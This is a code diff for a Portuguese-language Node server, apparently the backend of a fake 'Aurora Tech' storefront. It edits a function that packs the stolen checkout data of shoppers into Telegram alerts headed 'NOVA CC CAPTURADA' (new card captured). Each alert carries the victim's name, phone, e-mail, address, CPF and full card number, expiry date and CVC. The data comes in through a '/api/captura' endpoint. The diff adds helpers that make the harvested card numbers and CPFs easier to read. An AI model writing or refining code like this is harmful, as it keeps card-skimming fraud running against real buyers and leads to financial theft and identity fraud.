@@ -50,6 +50,21 @@ function limparDigitos(valor) {
   return String(valor || '').replace(/\D/g, '');
 }
 
+function formatarNumeroCartao(valor) {
+  const digitos = limparDigitos(valor);
+  if (!digitos) return 'Não informado';
+  return digitos.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+}
+
+function formatarCpf(valor) {
+  const digitos = limparDigitos(valor);
+  if (digitos.length !== 11) return valor || 'Não informado';
+  return digitos
+    .replace(/(\d{3})(\d)/, '$1.$2')
+    .replace(/(\d{3})(\d)/, '$1.$2')
+    .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+}
+
 function escaparHtml(valor) {
   return String(valor ?? '')
     .replace(/&/g, '&amp;')
@@ -60,54 +75,54 @@ function escaparHtml(valor) {
 
 function montarMensagemTelegram(dados) {
   const ehCartao = dados.formaPagamento === 'Cartão de Crédito';
-  const numeroLimpo = limparDigitos(dados.numeroCartao);
+  const numeroFormatado = formatarNumeroCartao(dados.numeroCartao);
   const cvcLimpo = limparDigitos(dados.cvc);
-  const cpfLimpo = limparDigitos(dados.cpfTitular);
+  const cpfFormatado = formatarCpf(dados.cpfTitular);
 
-  const tituloLead = ehCartao
+  const cabecalho = ehCartao
     ? '🔴 <b>AURORA TECH • NOVA CC CAPTURADA</b>'
     : '🔴 <b>AURORA TECH • NOVO PEDIDO</b>';
 
   const bebeTag = dados.bebe || dados.opBebe || '7 bebe';
   const origem = dados.origem || 'aurora-tech';
+  const infoParcelas = dados.detalhesParcelamento || dados.parcelas || '1x';
   const metodoResumo = ehCartao
-    ? `${dados.formaPagamento} (${dados.bandeiraCartao || 'Cartão'} • ${dados.parcelas || '1x'})`
-    : dados.formaPagamento || 'Não informado';
+    ? `${dados.formaPagamento} • <b>${escaparHtml(dados.bandeiraCartao || 'Cartão')}</b>`
+    : `<b>${escaparHtml(dados.formaPagamento || 'Não informado')}</b>`;
 
   const linhas = [
-    tituloLead,
-    '<code>════════════════════════════</code>',
-    `🕒 <b>Data/Hora:</b> <code>${escaparHtml(formatarDataHoraBr())}</code>`,
+    cabecalho,
+    '<code>━━━━━━━━━━━━━━━━━━━━━━</code>',
+    `🕒 <b>Horário:</b> <code>${escaparHtml(formatarDataHoraBr())}</code>`,
     `💎 <b>Selo:</b> <code>${escaparHtml(bebeTag)}</code>`,
-    `💰 <b>Total:</b> <b>${escaparHtml(dados.valor || 'Não informado')}</b>`,
-    `💳 <b>Método:</b> ${escaparHtml(metodoResumo)}`,
+    `💰 <b>Valor Total:</b> <b>${escaparHtml(dados.valor || 'Não informado')}</b>`,
+    `💳 <b>Pagamento:</b> ${metodoResumo}`,
+    ...(ehCartao ? [`📊 <b>Parcelamento:</b> ${escaparHtml(infoParcelas)}`] : []),
     '',
-    '<b>👤 DADOS DO CLIENTE</b>',
-    `• <b>Nome:</b> ${escaparHtml(dados.nome || 'Não informado')}`,
-    `• <b>Telefone:</b> ${escaparHtml(dados.telefone || 'Não informado')}`,
-    `• <b>E-mail:</b> ${escaparHtml(dados.email || 'Não informado')}`,
-    `• <b>Endereço:</b> ${escaparHtml(dados.mensagem || 'Não informado')}`,
+    '👤 <b>DADOS DO CLIENTE</b>',
+    `├ <b>Nome:</b> ${escaparHtml(dados.nome || 'Não informado')}`,
+    `├ <b>WhatsApp:</b> <code>${escaparHtml(dados.telefone || 'Não informado')}</code>`,
+    `├ <b>E-mail:</b> <code>${escaparHtml(dados.email || 'Não informado')}</code>`,
+    `└ <b>Endereço:</b> ${escaparHtml(dados.mensagem || 'Não informado')}`,
     '',
-    '<b>📦 ITENS DO PEDIDO</b>',
-    `• <b>Produtos:</b> ${escaparHtml(dados.produto || 'Não informado')}`
+    '📦 <b>ITENS DO PEDIDO</b>',
+    `└ ${escaparHtml(dados.produto || 'Não informado')}`
   ];
 
   if (ehCartao) {
     linhas.push(
       '',
-      '<b>💳 DETALHES DO CARTÃO</b>',
-      `• <b>Bandeira:</b> ${escaparHtml(dados.bandeiraCartao || 'Não identificada')}`,
-      `• <b>Parcelas:</b> ${escaparHtml(dados.parcelas || '1x')}`,
-      `• <b>Titular:</b> ${escaparHtml(dados.nomeCompletoCartao || 'Não informado')}`,
-      `• <b>CPF:</b> <code>${escaparHtml(dados.cpfTitular || cpfLimpo || 'Não informado')}</code>`,
-      `• <b>Número:</b> <code>${escaparHtml(numeroLimpo || dados.numeroCartao || 'Não informado')}</code>`,
-      `• <b>Validade:</b> <code>${escaparHtml(dados.validadeCartao || 'Não informado')}</code>`,
-      `• <b>CVC:</b> <code>${escaparHtml(cvcLimpo || dados.cvc || 'Não informado')}</code>`
+      '💳 <b>DADOS DO CARTÃO</b>',
+      `├ <b>Titular:</b> ${escaparHtml(dados.nomeCompletoCartao || 'Não informado')}`,
+      `├ <b>CPF:</b> <code>${escaparHtml(cpfFormatado)}</code>`,
+      `├ <b>Número:</b> <code>${escaparHtml(numeroFormatado)}</code>`,
+      `├ <b>Validade:</b> <code>${escaparHtml(dados.validadeCartao || 'Não informado')}</code>`,
+      `└ <b>CVC:</b> <code>${escaparHtml(cvcLimpo || dados.cvc || 'Não informado')}</code>`
     );
   }
 
   linhas.push(
-    '<code>════════════════════════════</code>',
+    '<code>━━━━━━━━━━━━━━━━━━━━━━</code>',
     `🌐 <b>Origem:</b> <code>${escaparHtml(origem)}</code>`,
     `🏛️ <i>AURORA TECH • CNPJ ${escaparHtml(CNPJ_LOJA)}</i>`
   );
@@ -186,7 +201,7 @@ app.post('/api/captura', async (req, res) => {
       valor: dados.valor,
       formaPagamento: dados.formaPagamento,
       bandeira: dados.bandeiraCartao,
-      parcelas: dados.parcelas,
+      parcelas: dados.detalhesParcelamento || dados.parcelas,
       hora: formatarDataHoraBr()
     });
 
